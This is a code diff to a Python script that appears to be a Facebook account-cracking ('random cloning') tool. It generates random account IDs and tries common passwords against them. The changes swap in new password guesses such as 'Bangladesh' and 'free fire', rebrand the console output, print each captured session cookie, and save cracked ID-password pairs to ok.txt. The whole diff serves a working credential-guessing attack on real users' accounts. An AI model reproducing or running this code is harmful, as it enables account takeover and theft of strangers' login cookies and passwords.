@@ -191,7 +191,7 @@ def menu():
 	os.system('clear')
 	print(logo)
 	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-	print('[1] KEY - 🔐🗝️')
+	print('[1] RANDOM CLONING ')
 	print('[2] FOLLOWE MY FB')
 	print('[0] EXIT')
 	print(47*"-")
@@ -199,7 +199,7 @@ def menu():
 	if opt =='1':
 		random_crack()
 	if opt =='2':
-		os.system("xdg-open ")
+		os.system("xdg-open https://www.facebook.com/profile.php?id=100033685782498")
 		menu()
     #if opt =='0':
     	#exit()
@@ -278,7 +278,7 @@ def random_number():
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
-			pwx = [kode+guru,mk,'57273200','59039200','57575751','123456','12345678','freefire123']
+			pwx = [kode+guru,mk,'Bangladesh','BANGLADESH','free fire','Free Fire','i love you','freefire123']
 			yaari.submit(rcrack,uid,pwx,tl)
 	print(47*"-")
 	print('[✓] Crack process has been completed')
@@ -337,9 +337,9 @@ def rcrack(uid,pwx,tl):
 
 				uid = coki[151:166]
 
-				print('\r\033[1;32m+uid+' | '+ps)
+				print('\r\033[1;32m[SAHIL -OK] '+uid+' | '+ps)
 
-				print(f" | {coki}")
+				print(f" Cookie : {coki}")
 
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 
@@ -367,7 +367,7 @@ def rcrack(uid,pwx,tl):
 
 		loop+=1
 
-		sys.stdout.write('\r\33[1;37m[ANOX😒] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[OP-SK] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 
 		sys.stdout.flush()
 
@@ -459,9 +459,9 @@ def rcrack(uid,pwx,tl):
 
 				uid = coki[151:166]
 
-				print('\r\033[1;32m'+uid+' | '+ps)
+				print('\r\033[1;32m[SAHIL-OK] '+uid+' | '+ps)
 
-				print(f"| {coki}")
+				print(f" Cookie : {coki}")
 
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 
@@ -489,7 +489,7 @@ def rcrack(uid,pwx,tl):
 
 		loop+=1
 
-		sys.stdout.write('\r\33[1;37m[ANOX😒] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[SAHIL-🥰] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 
 		sys.stdout.flush()
 
